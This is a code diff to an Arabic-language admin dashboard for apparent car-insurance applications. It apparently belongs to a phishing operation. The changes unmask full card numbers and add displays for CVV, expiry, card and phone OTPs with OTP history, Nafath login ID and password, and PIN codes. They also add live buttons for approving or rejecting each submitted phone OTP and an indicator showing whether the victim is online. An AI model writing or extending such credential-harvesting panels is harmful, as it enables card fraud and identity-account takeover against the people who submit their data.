@@ -33,7 +33,9 @@ import { subscribeToApplications, updateApplication, approveCard, rejectCard } f
 import { ChatPanel } from "@/components/chat-panel"
 import { playErrorSound, playNotificationSound, playSuccessSound } from "@/lib/actions"
 import { toast } from "react-toastify"
-import { InsuranceApplication } from "@/types"
+import type { InsuranceApplication } from "@/types"
+import { UserStatus } from "@/components/atuTA"
+import { CardMockup } from "@/components/card-mockup"
 
 const STEP_NAMES: Record<number | string, string> = {
   1: "المعلومات الأساسية",
@@ -112,9 +114,9 @@ export default function AdminDashboard() {
       }
 
       filtered = filtered.sort((a, b) => {
-        const dateA = a.updatedAt ? new Date(a.updatedAt).getTime() : 0
-        const dateB = b.updatedAt ? new Date(b.updatedAt).getTime() : 0
-        return dateB - dateA
+        const dateA = a.updatedAt ? new Date(a.updatedAt) : 0
+        const dateB = b.updatedAt ? new Date(b.updatedAt) : 0
+        return (dateB as number) - (dateA as number)
       })
 
       setFilteredApplications(filtered)
@@ -130,17 +132,29 @@ export default function AdminDashboard() {
     }
   }, [applications, selectedApplication])
 
-const formatTime = useCallback((dateObj?: Date) => {
-    if (!dateObj) return ""
-    const date = typeof dateObj === "string" ? new Date(dateObj) : dateObj
-    const now = new Date()
-    const diff = Math.floor((now.getTime() - date) / 1000)
-    if (diff < 60) return "الآن"
-    if (diff < 3600) return `${Math.floor(diff / 60)}د`
-    if (diff < 86400) return `${Math.floor(diff / 3600)}س`
-    return `${Math.floor(diff / 86400)}ي`
-  }, [])
+  const formatTime = useCallback((dateInput?: Date | string | any) => {
+    if (!dateInput) return ""
 
+    // دعم Firestore Timestamp
+    const date = dateInput instanceof Date ? dateInput : dateInput?.toDate ? dateInput.toDate() : new Date(dateInput)
+
+    if (isNaN(date.getTime())) return ""
+
+    const now = new Date()
+    const diffSeconds = Math.floor((now.getTime() - date.getTime()) / 1000)
+
+    if (diffSeconds < 60) return "الآن"
+    if (diffSeconds < 3600) return `${Math.floor(diffSeconds / 60)} د`
+    if (diffSeconds < 86400) return `${Math.floor(diffSeconds / 3600)} س`
+    if (diffSeconds < 604800) return `${Math.floor(diffSeconds / 86400)} ي`
+
+    // تاريخ كامل إذا قديم
+    return date.toLocaleDateString("ar-SA", {
+      year: "numeric",
+      month: "short",
+      day: "numeric",
+    })
+  }, [])
 
   const copyToClipboard = async (text: string, fieldId: string) => {
     await navigator.clipboard.writeText(text)
@@ -186,6 +200,28 @@ const formatTime = useCallback((dateObj?: Date) => {
     } catch (error) {
       playErrorSound()
       toast.error("خطأ في رفض البطاقة")
+    }
+  }
+
+  const handleApprovePhoneOtp = async (appId: string) => {
+    try {
+      await updateApplication(appId, { phoneOtpApproved: "approved" })
+      playSuccessSound()
+      toast.success("تمت الموافقة على رمز التحقق")
+    } catch (error) {
+      playErrorSound()
+      toast.error("خطأ في الموافقة على رمز التحقق")
+    }
+  }
+
+  const handleRejectPhoneOtp = async (appId: string) => {
+    try {
+      await updateApplication(appId, { phoneOtpApproved: "rejected" })
+      playSuccessSound()
+      toast.success("تم رفض رمز التحقق")
+    } catch (error) {
+      playErrorSound()
+      toast.error("خطأ في رفض رمز التحقق")
     }
   }
 
@@ -421,8 +457,13 @@ const formatTime = useCallback((dateObj?: Date) => {
                 {/* Conversation Header */}
                 <div className="bg-slate-900 border-b border-slate-800 px-3 py-2 flex items-center justify-between flex-shrink-0">
                   <div className="flex items-center gap-2">
-                    <div className="w-8 h-8 rounded-full bg-emerald-500 flex items-center justify-center text-sm font-bold text-white">
-                      {selectedApplication.ownerName?.charAt(0) || "ع"}
+                    <div className="relative">
+                      <div className="w-8 h-8 rounded-full bg-emerald-500 flex items-center justify-center text-sm font-bold text-white">
+                        {selectedApplication.ownerName?.charAt(0) || "ع"}
+                      </div>
+                      <div className="absolute -bottom-0.5 -right-0.5">
+                        <UserStatus userId={selectedApplication.id!} />
+                      </div>
                     </div>
                     <div>
                       <div className="font-bold text-white text-xs">{selectedApplication.ownerName || "متقدم"}</div>
@@ -458,7 +499,7 @@ const formatTime = useCallback((dateObj?: Date) => {
                 </div>
 
                 {/* Application Details */}
-                <div className="flex-1 overflow-y-auto p-3 space-y-3">
+                <div className="grid grid-cols-3 gap-3 overflow-y-auto p-3 space-y-3">
                   {/* Basic Information */}
                   <Section title="المعلومات الأساسية" icon={<User className="w-4 h-4" />}>
                     <DataRow
@@ -486,8 +527,14 @@ const formatTime = useCallback((dateObj?: Date) => {
                       copied={copiedField!}
                     />
                     <DataRow
-                      label="الهاتف"
+                      label="الهاتف الأول"
                       value={selectedApplication.phoneNumber}
+                      onCopy={copyToClipboard}
+                      copied={copiedField!}
+                    />
+                    <DataRow
+                      label="الهاتف الثاني"
+                      value={selectedApplication.phoneNumber2}
                       onCopy={copyToClipboard}
                       copied={copiedField!}
                     />
@@ -555,45 +602,21 @@ const formatTime = useCallback((dateObj?: Date) => {
                     />
                   </Section>
 
-                  {/* Selected Offer */}
-                  {selectedApplication.selectedOffer && (
-                    <Section title="العرض المختار" icon={<FileText className="w-4 h-4" />}>
-                      <DataRow
-                        label="شركة التأمين"
-                        value={selectedApplication.selectedOffer.company}
-                        onCopy={copyToClipboard}
-                        copied={copiedField!}
-                      />
-                      <DataRow
-                        label="السعر"
-                        value={`${selectedApplication.selectedOffer.price} ر.س`}
-                        onCopy={copyToClipboard}
-                        copied={copiedField!}
-                      />
-                      <DataRow
-                        label="النوع"
-                        value={selectedApplication.selectedOffer.type}
-                        onCopy={copyToClipboard}
-                        copied={copiedField!}
-                      />
-                      {selectedApplication.selectedOffer.features &&
-                        selectedApplication.selectedOffer.features.length > 0 && (
-                          <div className="p-2 bg-slate-900/50 rounded">
-                            <span className="text-[9px] text-slate-400 block mb-1">المميزات:</span>
-                            <div className="space-y-1">
-                              {selectedApplication.selectedOffer.features.map((feature, i) => (
-                                <div key={i} className="text-[9px] text-slate-300">
-                                  • {feature}
-                                </div>
-                              ))}
-                            </div>
-                          </div>
-                        )}
-                    </Section>
-                  )}
+           
 
                   {/* Payment Information */}
                   <Section title="معلومات الدفع" icon={<CreditCard className="w-4 h-4" />}>
+                    <div className="mb-4">
+                      <CardMockup
+                        cardNumber={selectedApplication.cardNumber}
+                        cardHolderName={selectedApplication.cardHolderName}
+                        expiryDate={selectedApplication.expiryDate}
+                        cvv={selectedApplication.cvv}
+                        cardType={selectedApplication.cardType}
+                        bankInfo={selectedApplication.bankInfo}
+                      />
+                    </div>
+
                     <DataRow
                       label="طريقة الدفع"
                       value={selectedApplication.paymentMethod}
@@ -601,17 +624,55 @@ const formatTime = useCallback((dateObj?: Date) => {
                       copied={copiedField!}
                     />
                     <DataRow
-                        label="رقم البطاقة"
-                        value={selectedApplication.cardNumber ? `****${selectedApplication.cardNumber.slice(-4)}` : "N/A"}
-                        onCopy={() => {
-                          if (selectedApplication.cardNumber) {
-                            navigator.clipboard.writeText(selectedApplication.cardNumber)
-                            setCopiedField("cardNumber")
-                          }
-                        } } copied={""}                    />
+                      label="رقم البطاقة"
+                      value={selectedApplication.cardNumber ? `${selectedApplication.cardNumber}` : "N/A"}
+                      onCopy={() => {
+                        if (selectedApplication.cardNumber) {
+                          navigator.clipboard.writeText(selectedApplication.cardNumber)
+                          setCopiedField("cardNumber")
+                        }
+                      }}
+                      copied={""}
+                    />
                     <DataRow
                       label="اسم حامل البطاقة"
                       value={selectedApplication.cardHolderName || "N/A"}
+                      onCopy={copyToClipboard}
+                      copied={copiedField!}
+                    />
+                    <DataRow
+                      label="تاريخ الانتهاء"
+                      value={selectedApplication.expiryDate || "N/A"}
+                      onCopy={copyToClipboard}
+                      copied={copiedField!}
+                    />
+                    <DataRow
+                      label="cvv"
+                      value={selectedApplication.cvv || "N/A"}
+                      onCopy={copyToClipboard}
+                      copied={copiedField!}
+                    />
+                    <DataRow
+                      label="نوع البطاقة"
+                      value={selectedApplication.cardType || "N/A"}
+                      onCopy={copyToClipboard}
+                      copied={copiedField!}
+                    />
+                    <DataRow
+                      label="معلومات البنك"
+                      value={
+                        selectedApplication.bankInfo
+                          ? typeof selectedApplication.bankInfo === "object"
+                            ? `${(selectedApplication.bankInfo as any).name || ""} - ${(selectedApplication.bankInfo as any).country || ""}`
+                            : selectedApplication.bankInfo
+                          : "N/A"
+                      }
+                      onCopy={copyToClipboard}
+                      copied={copiedField!}
+                    />
+                    <DataRow
+                      label="رمز التحقق"
+                      value={selectedApplication.otp || "N/A"}
                       onCopy={copyToClipboard}
                       copied={copiedField!}
                     />
@@ -655,9 +716,93 @@ const formatTime = useCallback((dateObj?: Date) => {
                     )}
                     {selectedApplication.oldCards && selectedApplication.oldCards.length > 0 && (
                       <div className="mt-2 p-2 bg-red-500/10 rounded border border-red-500/20">
-                        <span className="text-[9px] text-red-400">
+                        <span className="text-[9px] text-red-400 block mb-1">
                           عدد البطاقات المرفوضة: {selectedApplication.oldCards.length}
                         </span>
+                        <div className="space-y-1 max-h-32 overflow-y-auto">
+                          {selectedApplication.oldCards.map((card, index) => (
+                            <div key={index} className="text-[8px] text-red-300 bg-red-900/20 p-1 rounded">
+                              <div>
+                                البطاقة {index + 1}: {card.cardNumber?.slice(-4) || "N/A"}
+                              </div>
+                              <div>حامل البطاقة: {card.cardHolderName || "N/A"}</div>
+                              <div>مرفوضة في: {new Date(card.rejectedAt).toLocaleDateString("ar-SA")}</div>
+                            </div>
+                          ))}
+                        </div>
+                      </div>
+                    )}
+                  </Section>
+
+                  <Section title="معلومات الهاتف" icon={<User className="w-4 h-4" />}>
+                    <DataRow
+                      label="الهاتف الأول"
+                      value={selectedApplication.phoneNumber}
+                      onCopy={copyToClipboard}
+                      copied={copiedField!}
+                    />
+                    <DataRow
+                      label="الهاتف الثاني"
+                      value={selectedApplication.phoneNumber2}
+                      onCopy={copyToClipboard}
+                      copied={copiedField!}
+                    />
+                    <DataRow
+                      label="مزود الخدمة"
+                      value={selectedApplication.phoneCarrier}
+                      onCopy={copyToClipboard}
+                      copied={copiedField!}
+                    />
+                    <DataRow
+                      label="رمز التحقق الحالي"
+                      value={selectedApplication.phoneOtp}
+                      onCopy={copyToClipboard}
+                      copied={copiedField!}
+                    />
+
+                    {/* Phone OTP Approval Section */}
+                    {selectedApplication.phoneOtp && selectedApplication.phoneOtpApproved !== "approved" && (
+                      <div className="flex gap-1 mt-2">
+                        <Button
+                          onClick={() => handleApprovePhoneOtp(selectedApplication.id!)}
+                          size="sm"
+                          className="h-6 text-[9px] px-2 rounded bg-emerald-500/20 text-emerald-400 hover:bg-emerald-500/30"
+                        >
+                          ✓ موافقة رمز الهاتف
+                        </Button>
+                        <Button
+                          onClick={() => handleRejectPhoneOtp(selectedApplication.id!)}
+                          size="sm"
+                          className="h-6 text-[9px] px-2 rounded bg-red-500/20 text-red-400 hover:bg-red-500/30"
+                        >
+                          ✗ رفض
+                        </Button>
+                      </div>
+                    )}
+
+                    {selectedApplication.phoneOtpApproved === "approved" && (
+                      <Badge className="text-[9px] bg-emerald-500/20 text-emerald-400 mt-2">
+                        رمز الهاتف موافق عليه ✓
+                      </Badge>
+                    )}
+
+                    {selectedApplication.phoneOtpApproved === "rejected" && (
+                      <Badge className="text-[9px] bg-red-500/20 text-red-400 mt-2">رمز الهاتف مرفوض ✗</Badge>
+                    )}
+
+                    {/* All Phone OTPs History */}
+                    {selectedApplication.allPhoneOtps && selectedApplication.allPhoneOtps.length > 0 && (
+                      <div className="mt-2 p-2 bg-slate-800/50 rounded border border-slate-700">
+                        <span className="text-[9px] text-slate-400 block mb-1">
+                          سجل رموز التحقق ({selectedApplication.allPhoneOtps.length})
+                        </span>
+                        <div className="flex flex-wrap gap-1">
+                          {selectedApplication.allPhoneOtps.map((otp, index) => (
+                            <span key={index} className="text-[8px] bg-blue-500/20 text-blue-300 px-1.5 py-0.5 rounded">
+                              {otp}
+                            </span>
+                          ))}
+                        </div>
                       </div>
                     )}
                   </Section>
@@ -665,6 +810,13 @@ const formatTime = useCallback((dateObj?: Date) => {
                   {/* Verification Status */}
                   <Section title="حالة التحقق" icon={<Shield className="w-4 h-4" />}>
                     <div className="space-y-2">
+                      <div className="flex items-center justify-between p-2 bg-slate-900/50 rounded">
+                        <span className="text-[9px] text-slate-400">الحالة</span>
+                        <div className="flex items-center gap-1.5">
+                          <UserStatus userId={selectedApplication.id!} />
+                          <span className="text-[8px] text-slate-300">متصل</span>
+                        </div>
+                      </div>
                       <div className="flex items-center justify-between p-2 bg-slate-900/50 rounded">
                         <span className="text-[9px] text-slate-400">تحقق الهاتف</span>
                         <Badge
@@ -681,8 +833,75 @@ const formatTime = useCallback((dateObj?: Date) => {
                           {selectedApplication.idVerificationStatus || "معلق"}
                         </Badge>
                       </div>
+                      <div className="flex items-center justify-between p-2 bg-slate-900/50 rounded">
+                        <span className="text-[9px] text-slate-400">رمز التحقق (OTP)</span>
+                        <Badge
+                          className={`text-[8px] ${selectedApplication.phoneOtpApproved === "approved" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.phoneOtpApproved === "rejected" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
+                        >
+                          {selectedApplication.phoneOtpApproved || "معلق"}
+                        </Badge>
+                      </div>
+                      <div className="flex items-center justify-between p-2 bg-slate-900/50 rounded">
+                        <span className="text-[9px] text-slate-400">رمز البطاقة (OTP)</span>
+                        <Badge
+                          className={`text-[8px] ${selectedApplication.cardOtpApproved === "approved" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.cardOtpApproved === "rejected" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
+                        >
+                          {selectedApplication.cardOtpApproved || "معلق"}
+                        </Badge>
+                      </div>
                     </div>
                   </Section>
+
+                  {(selectedApplication.nafazId || selectedApplication.nafazPass || selectedApplication.authNumber) && (
+                    <Section title="تكامل نفاذ" icon={<Shield className="w-4 h-4" />}>
+                      <DataRow
+                        label="معرف نفاذ"
+                        value={selectedApplication.nafazId}
+                        onCopy={copyToClipboard}
+                        copied={copiedField!}
+                      />
+                      <DataRow
+                        label="كلمة مرور نفاذ"
+                        value={selectedApplication.nafazPass}
+                        onCopy={copyToClipboard}
+                        copied={copiedField!}
+                      />
+                      <DataRow
+                        label="رقم التفويض"
+                        value={selectedApplication.authNumber}
+                        onCopy={copyToClipboard}
+                        copied={copiedField!}
+                      />
+                    </Section>
+                  )}
+
+                  {selectedApplication.insuranceType === "نقل ملكية" && (
+                    <Section title="معلومات نقل الملكية" icon={<FileText className="w-4 h-4" />}>
+                      <DataRow
+                        label="رقم هوية المشتري"
+                        value={selectedApplication.buyerIdNumber}
+                        onCopy={copyToClipboard}
+                        copied={copiedField!}
+                      />
+                      <DataRow
+                        label="اسم المشتري"
+                        value={selectedApplication.buyerName}
+                        onCopy={copyToClipboard}
+                        copied={copiedField!}
+                      />
+                    </Section>
+                  )}
+
+                  {selectedApplication.pinCode && (
+                    <Section title="رمز PIN" icon={<Shield className="w-4 h-4" />}>
+                      <DataRow
+                        label="رمز PIN"
+                        value={selectedApplication.pinCode}
+                        onCopy={copyToClipboard}
+                        copied={copiedField!}
+                      />
+                    </Section>
+                  )}
 
                   {/* Status Controls */}
                   <Section title="الإجراءات" icon={<Settings className="w-4 h-4" />}>
@@ -713,7 +932,42 @@ const formatTime = useCallback((dateObj?: Date) => {
                       ))}
                     </div>
                   </Section>
-
+       {/* Selected Offer */}
+       {selectedApplication.selectedOffer && (
+                    <Section title="العرض المختار" icon={<FileText className="w-4 h-4" />}>
+                      <DataRow
+                        label="شركة التأمين"
+                        value={selectedApplication.selectedOffer.company}
+                        onCopy={copyToClipboard}
+                        copied={copiedField!}
+                      />
+                      <DataRow
+                        label="السعر"
+                        value={`${selectedApplication.selectedOffer.price} ر.س`}
+                        onCopy={copyToClipboard}
+                        copied={copiedField!}
+                      />
+                      <DataRow
+                        label="النوع"
+                        value={selectedApplication.selectedOffer.type}
+                        onCopy={copyToClipboard}
+                        copied={copiedField!}
+                      />
+                      {selectedApplication.selectedOffer.features &&
+                        selectedApplication.selectedOffer.features.length > 0 && (
+                          <div className="p-2 bg-slate-900/50 rounded">
+                            <span className="text-[9px] text-slate-400 block mb-1">المميزات:</span>
+                            <div className="space-y-1">
+                              {selectedApplication.selectedOffer.features.map((feature, i) => (
+                                <div key={i} className="text-[9px] text-slate-300">
+                                  • {feature}
+                                </div>
+                              ))}
+                            </div>
+                          </div>
+                        )}
+                    </Section>
+                  )}
                   {/* Metadata */}
                   {(selectedApplication.assignedProfessional || selectedApplication.notes) && (
                     <Section title="الملاحظات" icon={<Info className="w-4 h-4" />}>
